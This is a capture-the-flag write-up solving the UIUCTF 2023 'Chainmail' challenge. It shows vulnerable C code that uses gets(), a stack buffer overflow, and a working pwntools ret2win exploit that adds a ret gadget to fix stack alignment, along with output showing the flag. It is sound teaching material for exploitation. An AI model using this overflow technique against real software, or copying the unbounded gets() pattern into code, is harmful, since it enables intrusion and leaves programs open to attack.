# Chainmail - uiuctf 2023
## writeup by p3qch

We are greeted by two files, an ELF executable with the following properties:
```
$ checksec ./chal
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
And a C source file:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void give_flag() {
    FILE *f = fopen("/flag.txt", "r");
    if (f != NULL) {
        char c;
        while ((c = fgetc(f)) != EOF) {
            putchar(c);
        }
    }
    else {
        printf("Flag not found!\n");
    }
    fclose(f);
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    char name[64];
    printf("Hello, welcome to the chain email generator! Please give the name of a recipient: ");
    gets(name);
    printf("Okay, here's your newly generated chainmail message!\n\nHello %s,\nHave you heard the news??? Send this email to 10 friends or else you'll have bad luck!\n\nYour friend,\nJim\n", name);
    return 0;
}
```

If we look closely at main, we see the following line:
```c
    gets(name);
```
It's gets! The function that reads from stdin, without any length specification, meaning that we could write as much as we want to the stack.
Let's take a look at the way mains stack frame looks:
```
|---------------------|
| Saved RIP (8 bytes) |
|---------------------|
| Saved RBP (8 bytes) |
|---------------------|
|                     |
|      name buf       |
|     (64 bytes)      |
|                     |
|---------------------|
```
But what will we overwrite? With what? Obviously we'll overwrite saved RIP with the not changing (cuz there's no PIE) address of the functions give_flag()!
let's check the functions address:
```sh
$ gdb ./chal
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010b0  putchar@plt
0x00000000004010c0  puts@plt
0x00000000004010d0  fclose@plt
0x00000000004010e0  printf@plt
0x00000000004010f0  fgetc@plt
0x0000000000401100  gets@plt
0x0000000000401110  setvbuf@plt
0x0000000000401120  fopen@plt
0x0000000000401130  _start
0x0000000000401160  _dl_relocate_static_pie
0x0000000000401170  deregister_tm_clones
0x00000000004011a0  register_tm_clones
0x00000000004011e0  __do_global_dtors_aux
0x0000000000401210  frame_dummy
0x0000000000401216  give_flag
0x0000000000401288  main
0x000000000040133c  _fini
```
We see that the give_flag  function is at: `0x401216`. 
So to build our payload we need: 
- 64 bytes over buf
- 8 bytes over saved 
- And most importantly, the address of give_flag, packed in little endian (least significant byte goes first) and 64 bits.

let's try this:
```sh
$ python2 -c "print 'A' * 64 + 'B'*8 + '\x16\x12\x40\x00\x00\x00\x00\x00'" | ./chal
Hello, welcome to the chain email generator! Please give the name of a recipient: Okay, here's your newly generated chainmail message!

Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB@,
Have you heard the news??? Send this email to 10 friends or else you'll have bad luck!

Your friend,
Jim
flag{flag}
```
We get a flag! Let's try this on remote:
```sh
$ python2 -c "print 'A' * 64 + 'B'*8 + '\x16\x12\x40\x00\x00\x00\x00\x00'" | nc chainmail.chal.uiuc.tf 1337
Hello, welcome to the chain email generator! Please give the name of a recipient: Okay, here's your newly generated chainmail message!

Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB@,
Have you heard the news??? Send this email to 10 friends or else you'll have bad luck!

Your friend,
Jim
```
hmmm weird we didn't get a flag. Last time something like this happened to me it was the MOVABS issue. most likely fopen uses this instructions, and this instructions works only if the stack is aligned properly, but we misaligned it by putting our evil payload onto it. Let's fix it by adding something to the stack, but what can we add? let's add another `ret` address before our get_flag address. So that before we jump to get flag, we jump to another return and alighn the stack.
```sh
$ ROPgadget --binary chal --only  'ret'
Gadgets information
============================================================
0x000000000040101a : ret
```
So we see that there is a ret at `0x40101a`, lets pack it to our payload, and actually make a python script to make it a little easier to read:
```py
from pwn import *

if not args.REMOTE:
    target = process("./chal")
else:
    target = remote("chainmail.chal.uiuc.tf", 1337)

payload = b"A" * 64 # overwrite buffer
payload += b"B" * 8 # overwrite saved rbp
payload += p64(0x40101a) # align stack (this is a RET instruction address)
payload += p64(0x401216) # overwrite saved rip to give_flag

target.sendline(payload)
target.interactive()
```
Lets try this:

```
$ python3 ./solve.py REMOTE
[+] Opening connection to chainmail.chal.uiuc.tf on port 1337: Done
[*] Switching to interactive mode
== proof-of-work: disabled ==
Hello, welcome to the chain email generator! Please give the name of a recipient: Okay, here's your newly generated chainmail message!

Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x1a\x10@,
Have you heard the news??? Send this email to 10 friends or else you'll have bad luck!

Your friend,
Jim
uiuctf{y0ur3_4_B1g_5h0t_n0w!11!!1!!!11!!!!1}
```
And we get a flag! Hooray!